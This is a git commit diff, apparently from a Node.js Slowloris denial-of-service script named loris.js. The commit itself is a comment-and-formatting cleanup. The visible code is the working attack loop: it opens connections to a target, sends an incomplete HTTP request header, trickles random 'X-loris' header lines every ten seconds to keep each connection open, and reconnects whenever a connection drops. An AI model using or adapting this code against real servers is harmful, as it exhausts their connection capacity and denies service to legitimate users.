90eff9d36a08e889da67c50a0e6e0bca8f4eb827
Ian Szmidt <ian10_141@yahoo.com.br>
2017-10-18 19:50:50 -0200

    Code formatting.

--- loris.js
+++ loris.js
@@ -16,18 +16,20 @@ let c = process.argv[3] || 9999
 let alive = 0;
 
 const open = ()=>{	
+	//send just a part of the header, so the server keeps waiting for the rest of the request.
 	const client = net.connect(args.port, args.host, ()=> {	
 		alive++;
-		//send just a part of the header, so the server keeps waiting for the rest of the request
 		client.write('GET / HTTP/1.1\r\n');	
-	});	
+	});
+	
+	//send some random stuff to keep the connections open as long as possible.
 	const send = setInterval(()=>{
-		  //send some random stuff to keep connection open as long as possible
 		  client.write('X-loris:'+ Math.random()*999000);	
-	},10000)
+	},10000);
+	
+	//open a new connection every time a connection dies.
 	client.on('error', function() {
 		clearInterval(send);
-		//open a new connection every time a connection dies;
 		alive --;
 		open();
 	});
